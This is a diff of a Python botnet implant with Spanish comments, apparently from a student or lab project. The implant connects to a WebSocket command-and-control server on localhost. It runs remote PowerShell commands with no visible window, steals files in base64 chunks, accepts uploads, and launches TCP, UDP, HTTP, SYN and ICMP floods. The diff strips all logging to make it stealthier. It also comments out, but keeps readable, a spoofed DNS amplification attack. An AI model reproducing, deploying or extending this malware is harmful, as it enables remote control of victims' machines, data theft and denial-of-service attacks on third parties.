@@ -1,4 +1,5 @@
 import asyncio
+import ctypes
 import json
 import subprocess
 import signal
@@ -12,8 +13,12 @@ import time
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError
 from typing import List, Dict, Tuple, Optional
-from scapy.all import IP, UDP, DNS, DNSQR, send, Raw
+#from scapy.all import IP, UDP, DNS, DNSQR, send, Raw
 import requests
+
+""" if sys.platform == "win32":
+    ctypes.windll.kernel32.FreeConsole()
+ """
 
 class Impl:
     def __init__(self, c2_ws_url: str, group: str = "grupo1"):
@@ -36,14 +41,14 @@ class Impl:
             try:
                 await self._connect_to_c2()
             except Exception as e:
-                print(f"Error de conexión: {e}, reintentando en 5 segundos...")
+                #print(f"Error de conexión: {e}, reintentando en 5 segundos...")
                 await asyncio.sleep(5)
     
     async def _connect_to_c2(self) -> None:
         """Establece conexión WebSocket con el C2"""
         async with connect(f"{self.c2_ws_url}?id={self.impl_id}") as ws:
-            print(ws)
-            print(f"[+] Conectado a C2 en {self.c2_ws_url}")
+            #print(ws)
+            #print(f"[+] Conectado a C2 en {self.c2_ws_url}")
             while self.running:
                 await self._handle_commands(ws)
     
@@ -60,18 +65,19 @@ class Impl:
             elif 'list_files' in data:
                 await self._list_directory(ws, data.get('path', self.current_dir))
             elif 'get_files' in data:
-                await self._send_file(ws, data['get_files'])
+                path=data['get_files']
+                await self._send_file(ws, str(path))
             elif 'attack' in data:
                 await self._handle_attack_command(ws, data)
             elif 'stop_attack' in data:
-                print(data['stop_attack'])
+                #print(data['stop_attack'])
                 await self._stop_attack(ws, data['stop_attack'])
         
         except ConnectionClosedError:
-            print("[-] Conexión cerrada por el servidor")
+            #print("[-] Conexión cerrada por el servidor")
             raise
         except Exception as e:
-            print(f"[-] Error procesando comando: {e}")
+            #print(f"[-] Error procesando comando: {e}")
             await ws.send(json.dumps({"error": str(e)}))
     
     async def _execute_command(self, ws, command: str) -> None:
@@ -115,7 +121,8 @@ class Impl:
         result = subprocess.run(
             ['powershell.exe', '-Command', f'Set-Location "{self.current_dir}"; {escaped_cmd}'],
             capture_output=True, 
-            text=True
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW
         )
         return result.stdout, result.stderr, self.current_dir
     
@@ -140,7 +147,7 @@ class Impl:
                 self.upload_destination = None
                 
                 await ws.send(json.dumps({
-                    "status": "success",
+                    "status": "upload_complete",
                     "message": f"Archivo recibido en {self.upload_destination}"
                 }))
         
@@ -181,25 +188,39 @@ class Impl:
                 "status": "error"
             }))
     
-    async def _send_file(self, ws, file_path: str) -> None:
-        """Envía un archivo al C2"""
+    async def _send_file(self, ws, file_path:str) -> None:
+
+        if file_path.startswith("//"):
+            file_path=file_path.replace("//","/")
+
+
+        CHUNK_SIZE = 64 * 1024
         if not os.path.isfile(file_path):
             await ws.send(json.dumps({
                 "error": f"Archivo no encontrado: {file_path}",
                 "status": "error"
             }))
             return
-        
+
         try:
             with open(file_path, "rb") as f:
-                content = base64.b64encode(f.read()).decode("utf-8")
-            
-            await ws.send(json.dumps({
-                "filename": os.path.basename(file_path),
-                "path": file_path,
-                "content": content,
-                "status": "success"
-            }))
+                while True:
+                    chunk = f.read(CHUNK_SIZE)
+                    if not chunk:
+                        break
+
+                    encoded = base64.b64encode(chunk).decode("utf-8")
+                    is_last = f.tell() == os.path.getsize(file_path)
+
+                    await ws.send(json.dumps({
+                        "filename": os.path.basename(file_path),
+                        "path": file_path,
+                        "chunk": encoded,
+                        "last": is_last
+                    }))
+                    
+                    await asyncio.sleep(0)  # cede control para evitar bloquear el bucle
+
         except Exception as e:
             await ws.send(json.dumps({
                 "error": str(e),
@@ -238,9 +259,10 @@ class Impl:
             }))
         else:
             for attack in self.attacks:
-                print("loop")
+                #print("loop")
                 if attack_type == attack['type']:
-                    print(f"already running {attack_type} {attack['type']}")
+                    next
+                    #print(f"already running {attack_type} {attack['type']}")
                 else:
                     
                     # Obtener el bucle de eventos actual
@@ -284,12 +306,14 @@ class Impl:
                 self._syn_flood_attack(target, end_time, stop_thread)
             elif attack_type == "icmp_flood":
                 self._icmp_flood_attack(target, end_time, stop_thread)
-            elif attack_type == "dns_amplification":
-                self._dns_amplification_attack(target, end_time, stop_thread)
+#            elif attack_type == "dns_amplification":
+#                self._dns_amplification_attack(target, end_time, stop_thread)
             else:
-                print(f"[!] Tipo de ataque no reconocido: {attack_type}")
+                next
+                #print(f"[!] Tipo de ataque no reconocido: {attack_type}")
         except Exception as e:
-            print(f"[!] Error en el ataque: {e}")
+            next
+            #print(f"[!] Error en el ataque: {e}")
         finally:
             # Notificar que el ataque ha terminado
             asyncio.run_coroutine_threadsafe(
@@ -309,7 +333,8 @@ class Impl:
                 "message": "Ataque completado"
             }))
         except Exception as e:
-            print(f"[!] Error notificando finalización del ataque: {e}")
+            next
+            #print(f"[!] Error notificando finalización del ataque: {e}")
 
 
     
@@ -318,7 +343,7 @@ class Impl:
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
-        print(f"[*] Iniciando tcp Flood a {target}")
+        #print(f"[*] Iniciando tcp Flood a {target}")
         while time.time() < end_time and not stop_thread.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -335,7 +360,7 @@ class Impl:
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
-        print(f"[*] Iniciando udp Flood a {target}")
+        #print(f"[*] Iniciando udp Flood a {target}")
         while time.time() < end_time and not stop_thread.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -370,7 +395,7 @@ class Impl:
             method='GET'
         )
         
-        print(f"[*] Iniciando HTTP Flood a {target}")
+        #print(f"[*] Iniciando HTTP Flood a {target}")
         
         # 5. Bucle principal de ataque
         while time.time() < end_time and not stop_thread.is_set():
@@ -383,13 +408,13 @@ class Impl:
                 time.sleep(0.01)
                 
             except urllib.error.URLError as e:
-                print(f"[!] Error de URL: {e.reason}")
+                #print(f"[!] Error de URL: {e.reason}")
                 break
             except Exception as e:
-                print(f"[!] Error: {str(e)}")
+                #print(f"[!] Error: {str(e)}")
                 time.sleep(1)  # Esperar antes de reintentar
         
-        print("[*] Ataque HTTP Flood finalizado")
+        #print("[*] Ataque HTTP Flood finalizado")
     
 
     
@@ -453,42 +478,42 @@ class Impl:
                 pass
     
 
-    def _dns_amplification_attack(self, target: str, end_time: float, stop_thread) -> None:
-        """Ataque de amplificación DNS con IP spoofing"""
-        # Lista de servidores DNS abiertos (considera usar una lista más grande)
-        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
-        target_ip = target.split(":")[0]
-        
-        # Dominios con respuestas grandes para mayor amplificación
-        large_domains = [
-            "example.com", 
-            "isc.org", 
-            "ripe.net",
-            "google.com",
-            "microsoft.com"
-        ]
-        
-        while time.time() < end_time and not stop_thread.is_set():
-            try:
-                for dns_server in dns_servers:
-                    # Seleccionar un dominio aleatorio
-                    domain = random.choice(large_domains)
-                    
-                    # Crear paquete DNS con Scapy para mayor control
-                    # Usamos tipo ANY (255) o TXT para respuestas más grandes
-                    dns_query = IP(dst=dns_server, src=target_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(
-                        rd=1,
-                        qd=DNSQR(qname=domain, qtype="ANY")
-                    )
-                    
-                    # Enviar el paquete con IP falsificada
-                    send(dns_query, verbose=0)
-                    
-                    # Pequeña pausa para evitar saturación local
-                    time.sleep(0.01)
-                    
-            except Exception as e:
-                pass
+#    def _dns_amplification_attack(self, target: str, end_time: float, stop_thread) -> None:
+#        """Ataque de amplificación DNS con IP spoofing"""
+#        # Lista de servidores DNS abiertos (considera usar una lista más grande)
+#        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
+#        target_ip = target.split(":")[0]
+#        
+#        # Dominios con respuestas grandes para mayor amplificación
+#        large_domains = [
+#            "example.com", 
+#            "isc.org", 
+#            "ripe.net",
+#            "google.com",
+#            "microsoft.com"
+#        ]
+#        
+#        while time.time() < end_time and not stop_thread.is_set():
+#            try:
+#                for dns_server in dns_servers:
+#                    # Seleccionar un dominio aleatorio
+#                    domain = random.choice(large_domains)
+#                    
+#                    # Crear paquete DNS con Scapy para mayor control
+#                    # Usamos tipo ANY (255) o TXT para respuestas más grandes
+#                    dns_query = IP(dst=dns_server, src=target_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(
+#                        rd=1,
+#                        qd=DNSQR(qname=domain, qtype="ANY")
+#                    )
+#                    
+#                    # Enviar el paquete con IP falsificada
+#                    send(dns_query, verbose=0)
+#                    
+#                    # Pequeña pausa para evitar saturación local
+#                    time.sleep(0.01)
+#                    
+#            except Exception as e:
+#                pass
 
 
     def _close_sockets(self, sockets: list) -> None:
@@ -539,10 +564,10 @@ class Impl:
             'impl_id': self.impl_id
         }
  
-        print(f"[+] Implante registrado: {model}")
-        req = requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)
+        #print(f"[+] Implante registrado: {model}")
+        req = requests.post(f"http://127.0.0.1:4000/api/impl/new/{model['impl_id']}", data=model)
 
-        print(req)
+        #print(req)
 
     @property
     def impl_id(self) -> str:
@@ -578,15 +603,19 @@ class Impl:
     
     def _def_handler(self, sig, frame) -> None:
         """Manejador de señales para salida limpia"""
-        print("\n\n[!] Saliendo..\n")
+        #print("\n\n[!] Saliendo..\n")
         self.running = False
         
         sys.exit(1)
 
 if __name__ == "__main__":
-    # Configuración del implante
-    C2_WS_URL = "ws://localhost:4000/api/rcv"
-    GROUP_NAME = "grupo1"
-    
-    impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
-    asyncio.run(impl.run())
+    try:
+        # Configuración del implante
+        C2_WS_URL = "ws://127.0.0.1:4000/api/rcv"
+        GROUP_NAME = "Remote 2"
+        
+        impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
+        asyncio.run(impl.run())
+    except Exception as e:
+        next
+        #print(e)
